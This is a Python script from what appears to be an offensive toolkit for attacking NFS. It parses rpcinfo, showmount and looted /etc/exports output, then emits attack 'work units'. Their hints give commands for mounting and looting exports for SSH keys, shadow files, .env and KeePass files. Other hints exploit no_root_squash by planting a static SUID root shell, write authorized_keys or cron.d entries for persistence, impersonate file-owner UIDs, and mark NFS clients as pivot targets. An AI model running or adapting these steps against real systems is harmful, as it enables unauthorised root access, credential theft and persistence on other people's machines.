#!/usr/bin/env python3
"""parse_nfs.py — nfs-enum handoff parser (Section9Labs / vulture, crew lapis-bough)

Parses:
  * rpcinfo -p output            --rpcinfo HOST=FILE      (repeatable)
  * showmount -e output          --showmount HOST=FILE    (repeatable)
  * showmount -a output          --showmount-a HOST=FILE  (repeatable; client disclosure)
  * looted /etc/exports          --exports-file HOST=FILE (repeatable; real options)

Emits into --out-dir (default nfs_out/):
  nfs_enum.json    per-host records:
                   {host, exports:[{path, allowed:[], options:[], world_readable,
                    no_root_squash}], nfs_versions:[], mountd_port, clients:[]}
  work_units.json  clean JSON array [{id,title,targets,hints}]
                   (mount-and-loot / no_root_squash-exploit / uid-impersonation units)

Standalone, python3 stdlib only.

Examples:
  rpcinfo -p 192.0.2.20   > rpcinfo.txt
  showmount -e 192.0.2.20 > exports.txt
  python3 scripts/parse_nfs.py --rpcinfo 192.0.2.20=rpcinfo.txt \
      --showmount 192.0.2.20=exports.txt --out-dir nfs_out
"""
import argparse
import json
import os
import re
import sys

WORLD_ACLS = {"*", "(everyone)", "everyone", "0.0.0.0/0", "0.0.0.0"}


def kv_pairs(values):
    out = {}
    for v in values or []:
        if "=" not in v:
            sys.exit("expected HOST=FILE, got: %r" % v)
        k, _, val = v.partition("=")
        out.setdefault(k, []).append(val)
    return out


# ---------------------------------------------------------------- parsers

def parse_rpcinfo(path):
    """rpcinfo -p: '  100003  3  tcp  2049  nfs' -> versions/ports per service."""
    nfs_versions, mountd_port, services = set(), None, set()
    rx = re.compile(r"^\s*(\d+)\s+(\d+)\s+(tcp|udp|tcp6|udp6)\s+(\d+)\s*(\S*)")
    with open(path, errors="replace") as f:
        for line in f:
            m = rx.match(line)
            if not m:
                continue
            prog, vers, _proto, port, name = m.groups()
            name = name or {"100003": "nfs", "100005": "mountd",
                            "100021": "nlockmgr", "100024": "status"}.get(prog, prog)
            services.add(name)
            if name == "nfs" or prog == "100003":
                nfs_versions.add(int(vers))
            if name == "mountd" or prog == "100005":
                mountd_port = int(port)
    return sorted(nfs_versions), mountd_port, sorted(services)


def parse_showmount_e(path):
    """showmount -e: 'Export list for h:' then '/path acl1,acl2 ...'."""
    exports = []
    with open(path, errors="replace") as f:
        for line in f:
            s = line.rstrip("\n")
            if not s.strip() or s.lower().startswith("export list"):
                continue
            m = re.match(r"^(\S+)\s+(.*)$", s.strip())
            if not m or not m.group(1).startswith("/"):
                continue
            path_, acl = m.group(1), m.group(2).strip()
            allowed = [a for a in re.split(r"[,\s]+", acl) if a]
            exports.append({"path": path_, "allowed": allowed, "options": []})
    return exports


def parse_showmount_a(path):
    """showmount -a: 'client:/export' pairs -> client hosts (new targets)."""
    clients = set()
    with open(path, errors="replace") as f:
        for line in f:
            s = line.strip()
            if ":" in s and not s.lower().startswith("all mount points"):
                clients.add(s.split(":", 1)[0])
    return sorted(clients)


def parse_exports_file(path):
    """/etc/exports: '/path client(opt,opt) client2(opt)' -> {path: [(client, [opts])]}."""
    out = {}
    with open(path, errors="replace") as f:
        for line in f:
            s = line.split("#", 1)[0].strip()
            if not s or not s.startswith("/"):
                continue
            parts = s.split()
            path_, rest = parts[0], parts[1:]
            entries = []
            for tok in rest:
                m = re.match(r"^([^(]*)\(([^)]*)\)$", tok)
                if m:
                    client = m.group(1) or "*"
                    opts = [o.strip() for o in m.group(2).split(",") if o.strip()]
                else:
                    client, opts = tok, []  # bare client => defaults (ro,root_squash)
                entries.append((client, opts))
            out.setdefault(path_, []).extend(entries)
    return out


# ---------------------------------------------------------------- flags

def flag_export(exp):
    acl = [a.lower() for a in exp["allowed"]]
    opts = [o.lower() for o in exp["options"]]
    exp["world_readable"] = (not acl) or any(a in WORLD_ACLS for a in acl)
    exp["no_root_squash"] = "no_root_squash" in opts
    exp["rw"] = "rw" in opts
    exp["insecure"] = "insecure" in opts
    exp["options_known"] = bool(opts)
    return exp


def slug(p):
    return re.sub(r"[^a-z0-9]+", "-", p.lower()).strip("-") or "root"


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--rpcinfo", action="append", default=[], metavar="HOST=FILE")
    ap.add_argument("--showmount", action="append", default=[], metavar="HOST=FILE")
    ap.add_argument("--showmount-a", action="append", default=[], metavar="HOST=FILE")
    ap.add_argument("--exports-file", action="append", default=[], metavar="HOST=FILE",
                    help="looted /etc/exports for HOST: fills real options per export")
    ap.add_argument("--out-dir", default="nfs_out")
    args = ap.parse_args()

    hosts = {}

    def rec(h):
        return hosts.setdefault(h, {"host": h, "exports": [], "nfs_versions": [],
                                    "mountd_port": None, "clients": []})

    for host, files in kv_pairs(args.rpcinfo).items():
        r = rec(host)
        for path in files:
            vers, mport, _svcs = parse_rpcinfo(path)
            r["nfs_versions"] = sorted(set(r["nfs_versions"]) | set(vers))
            r["mountd_port"] = r["mountd_port"] or mport

    for host, files in kv_pairs(args.showmount).items():
        r = rec(host)
        for path in files:
            for e in parse_showmount_e(path):
                if not any(x["path"] == e["path"] for x in r["exports"]):
                    r["exports"].append(e)

    for host, files in kv_pairs(args.showmount_a).items():
        r = rec(host)
        for path in files:
            r["clients"] = sorted(set(r["clients"]) | set(parse_showmount_a(path)))

    for host, files in kv_pairs(args.exports_file).items():
        r = rec(host)
        for path in files:
            for epath, entries in parse_exports_file(path).items():
                tgt = next((x for x in r["exports"] if x["path"] == epath), None)
                if tgt is None:
                    tgt = {"path": epath, "allowed": [], "options": []}
                    r["exports"].append(tgt)
                for client, opts in entries:
                    if client not in tgt["allowed"]:
                        tgt["allowed"].append(client)
                    tgt["options"] = sorted(set(tgt["options"]) | set(opts))

    for r in hosts.values():
        r["exports"] = [flag_export(e) for e in r["exports"]]

    # ---------------------------------------------------------------- units
    units = []
    for h, r in sorted(hosts.items()):
        v4_only = r["nfs_versions"] == [4]
        if (v4_only or not r["exports"]) and (4 in r["nfs_versions"] or not r["nfs_versions"]):
            units.append({
                "id": "nfs-v4-pseudo-root-%s" % h,
                "title": "Mount NFSv4 pseudo-root of %s and browse all exports" % h,
                "targets": [h],
                "hints": ["sudo mount -t nfs -o vers=4 %s:/ /mnt/nfs4" % h,
                          "showmount may be empty on v4-only servers; browse the pseudo-fs",
                          "ls -laR; sweep for keys/configs/backups"]})
        for e in r["exports"]:
            sl = slug(e["path"])
            mnt_hint = "sudo mount -t nfs -o vers=3,nolock %s:%s /mnt/nfs_%s" % (h, e["path"], sl)
            if r["mountd_port"]:
                mnt_hint += "   # mountport=%d if portmapper is filtered" % r["mountd_port"]
            units.append({
                "id": "nfs-mount-loot-%s-%s" % (h, sl),
                "title": "Mount and loot %s:%s (acl: %s)" % (h, e["path"],
                                                             ",".join(e["allowed"]) or "unknown"),
                "targets": [h],
                "hints": [
                    mnt_hint,
                    "find /mnt/nfs_%s -maxdepth 4 -name 'id_rsa*' -o -name '*.key' -o "
                    "-name 'authorized_keys' -o -name '*.kdbx' -o -name 'shadow' -o "
                    "-name '.env' -o -name '*.sql' -o -name '*.tar*'" % sl,
                    "ls -ln to collect owner uids for impersonation",
                    "test uid-0 write: sudo touch /mnt/nfs_%s/.rootprobe && ls -ln  "
                    "(root-owned => no_root_squash)" % sl]})
            if e["no_root_squash"] or (not e["options_known"] and e["world_readable"]):
                sure = "confirmed" if e["no_root_squash"] else "suspected (options unknown — verify with uid-0 write test)"
                units.append({
                    "id": "nfs-norootsquash-exploit-%s-%s" % (h, sl),
                    "title": "Exploit no_root_squash on %s:%s [%s]" % (h, e["path"], sure),
                    "targets": [h],
                    "hints": [
                        "drop static SUID shell: gcc -static -o <mnt>/pwn pwn.c; "
                        "sudo chown root:root <mnt>/pwn; sudo chmod 4755 <mnt>/pwn",
                        "or write /root/.ssh/authorized_keys / /etc/cron.d entry if "
                        "that tree is inside the export",
                        "execute the SUID binary from any shell on %s -> root; hand off "
                        "to exploitation flow" % h]})
            units.append({
                "id": "nfs-uid-impersonate-%s-%s" % (h, sl),
                "title": "UID-impersonation sweep of %s:%s (read/write as file owners)" % (h, e["path"]),
                "targets": [h],
                "hints": [
                    "collect owner uids: find <mnt> -printf '%U\\n' | sort -u",
                    "per uid: sudo useradd -u <uid> tmpu; sudo -u tmpu re-sweep for loot",
                    "rw export: drop ~/.ssh/authorized_keys into owned homes -> ssh in",
                    "'insecure' option: use libnfs (nfs-ls 'nfs://%s%s?version=3&uid=0') "
                    "without local root" % (h, e["path"])]})
        for c in r["clients"]:
            units.append({
                "id": "host-discovery-%s" % slug(c),
                "title": "New target %s seen as NFS client of %s (showmount -a)" % (c, h),
                "targets": [c],
                "hints": ["feed to host-discovery/port-scan",
                          "it sits inside the export ACLs — good pivot point for "
                          "blocked-acl exports on %s" % h]})

    # ---------------------------------------------------------------- output
    os.makedirs(args.out_dir, exist_ok=True)
    records = sorted(hosts.values(), key=lambda r: r["host"])
    with open(os.path.join(args.out_dir, "nfs_enum.json"), "w") as f:
        json.dump(records, f, indent=2)
    with open(os.path.join(args.out_dir, "work_units.json"), "w") as f:
        json.dump(units, f, indent=2)

    flagged = sum(1 for r in records for e in r["exports"]
                  if e["world_readable"] or e["no_root_squash"])
    print("[parse_nfs] hosts=%d exports=%d flagged=%d work_units=%d -> %s/"
          % (len(records), sum(len(r["exports"]) for r in records),
             flagged, len(units), args.out_dir))


if __name__ == "__main__":
    main()
